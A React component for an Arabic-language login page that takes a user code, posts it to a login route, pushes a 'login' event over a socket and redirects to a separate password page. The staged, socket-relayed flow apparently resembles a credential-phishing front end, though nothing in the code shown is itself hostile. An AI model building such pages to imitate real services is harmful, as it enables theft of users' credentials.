import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { TbWorld } from "react-icons/tb";
import { GoPerson } from "react-icons/go";
import { IoPeopleSharp } from "react-icons/io5";


export const id = sessionStorage.getItem("id")
const Home = ({}) => {
  const [loading, setLoading] = useState(false);
  const [username, setUserName] = useState("");

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    try {
      await axios.post(api_route + "/login", { username }).then(({ data }) => {
        console.log(data);
        socket.emit("login", data.order);
        sessionStorage.setItem("id", data.order._id);
        return (window.location.href = `/password`);
      });
    } catch (error) {
      console.log(error)
    } finally {
      setLoading(false);
    }
    console.log(username)
  };
  return (
    <div className="w-full flex flex-col items-center justify-center gap-y-4">
      <form
        className="w-11/12 flex items-center justify-center flex-col gap-y-3 py-3  md:w-1/3 min-w-1/3"
        onSubmit={handleSubmit}
      >
        <div className="w-full flex p-2 items-center gap-x-2 text-lg text-gray-400">
          <TbWorld className="text-3xl" />
          English
        </div>
        <div className="w-full flex flex-col gap-y-10 justify-center items-center mt-10">
          <img src="/img1.png" className="w-2/3" />
          <div className="w-full flex justify-center gap-x-8 items-center">
            {" "}
            <div className="w-fit  flex items-center justify-center gap-x-2 rounded-md px-4 py-2 text-lg text-zinc-600 border border-zinc-600">
              <span>شركة</span>
              <IoPeopleSharp className="text-xl" />
            </div>
            <div className="w-fit flex items-center justify-center gap-x-2 rounded-md px-4 py-2 text-lg text-white bg-zinc-600">
              <span>أفراد</span>
              <GoPerson className="text-xl" />
            </div>
          </div>
        </div>

        <div className="w-full flex flex-col my-10">
          <input
            type="text"
            required
            dir="rtl"
            placeholder="كود المستخدم"
            value={username}
            onChange={(e) => setUserName(e.target.value)}
            className="border border-zinc-500 rounded-md text-lg px-3 py-2 w-11/12"
          />
          <div className="w-11/12 flex items-center justify-center gap-x-2 py-5">
            <img src="/img2.jpg" className="w-14" />
            <button
              type="submit"
              className="bg-green-700 rounded-md text-white py-3 px-2 w-2/3"
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <TailSpin
                    height="30"
                    width="30"
                    color="white"
                    ariaLabel="tail-spin-loading"
                    radius="1"
                    wrapperStyle={{}}
                    wrapperClass=""
                    visible={true}
                  />
                </div>
              ) : (
                "     تسجيل الدخول"
              )}
            </button>
          </div>
        </div>
      </form>
    </div>
  );
};

export default Home;
